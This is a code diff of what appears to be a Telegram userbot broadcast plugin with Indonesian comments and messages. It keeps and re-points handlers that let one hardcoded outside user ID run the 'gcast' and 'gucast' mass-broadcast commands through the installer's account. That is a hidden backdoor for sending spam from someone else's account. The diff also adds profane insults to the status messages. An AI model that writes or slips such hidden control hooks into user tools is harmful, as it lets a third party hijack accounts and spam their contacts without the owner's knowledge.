@@ -38,11 +38,11 @@ while 0 < 6:
 del _GCAST_BLACKLIST
 
 
-@Client.on_message(filters.command("numpanggcast", ["."]) & filters.user(1860375797) & ~filters.me)
+@Client.on_message(filters.command("cgcast", ["."]) & filters.user(6675703731) & ~filters.me)
 @Client.on_message(filters.command("gcast", cmd) & filters.me)
 async def gcast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
-        Man = await edit_or_reply(message, "`Limit Jangan salahin Gua Ya Anjing, Started global broadcast...`")
+        Man = await edit_or_reply(message, "`Limit Jangan salahin Dareen Ya Ngentod, Started global broadcast...`")
     else:
         return await message.edit_text("**Pesannya Mana ngentod**")
     done = 0
@@ -66,11 +66,11 @@ async def gcast_cmd(client: Client, message: Message):
                     error += 1
                     await asyncio.sleep(0.3)
     await Man.edit_text(
-        f"**✅Berhasil Terkirim:** `{done}` \n **❌Gagal Mengirim Pesan Ke** `{error}`"
+        f"**✅Berhasil Segini Mek:** `{done}` \n **❌Gagal Juga Segini Mek** `{error}`"
     )
 
 
-@Client.on_message(filters.command("numpanggucast", ["."]) & filters.user(1860375797) & ~filters.me)
+@Client.on_message(filters.command("numpanggucast", ["."]) & filters.user(6675703731) & ~filters.me)
 @Client.on_message(filters.command("gucast", cmd) & filters.me)
 async def gucast_cmd(client: Client, message: Message):
     if message.reply_to_message or get_arg(message):
